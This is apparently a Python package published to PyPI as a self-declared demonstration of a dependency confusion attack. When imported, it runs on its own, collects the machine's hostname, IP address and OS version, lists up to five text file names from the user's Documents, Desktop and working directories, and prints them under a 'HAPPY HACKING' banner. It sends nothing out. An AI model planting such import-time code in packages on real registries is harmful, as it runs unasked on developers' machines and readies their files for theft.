import socket
import platform
import os
import datetime
import glob

print("[SECURITY DEMO] merbe package from PyPI loaded!")
print("[SECURITY DEMO] This demonstrates a dependency confusion attack")

def merbe():
    """Log basic system info to demonstrate the concept"""
    # Get system information
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    
    # Find some text files in common locations (limited to 5 for demo purposes)
    text_files = []
    common_locations = [
        os.path.expanduser("~/Documents"),
        os.path.expanduser("~/Desktop"),
        os.path.join(os.getcwd())
    ]
    
    for location in common_locations:
        if os.path.exists(location):
            files = glob.glob(os.path.join(location, "*.txt"))
            text_files.extend(files[:5])  # Limit to 5 files per location
            if len(text_files) >= 5:  # Limit to 5 files total
                text_files = text_files[:5]
                break
    
    # Print the "hacked" information directly to the user
    print("\n" + "*" * 50)
    print("*" + " " * 48 + "*")
    print("*               HAPPY HACKING                 *")
    print("*" + " " * 48 + "*")
    print("*" * 50)
    print(f"\nComputer: {hostname}")
    print(f"IP Address: {ip}")
    print(f"Operating System: {platform.system()} {platform.release()}")
    
    if text_files:
        print("\nText files found:")
        for i, file in enumerate(text_files, 1):
            print(f"  {i}. {os.path.basename(file)}")
    else:
        print("\nNo text files found in common locations")
    
    print("*" * 50)

# Run the demo function when imported
merbe()

def get_version():
    return "3.1.0 (public - demonstration package)"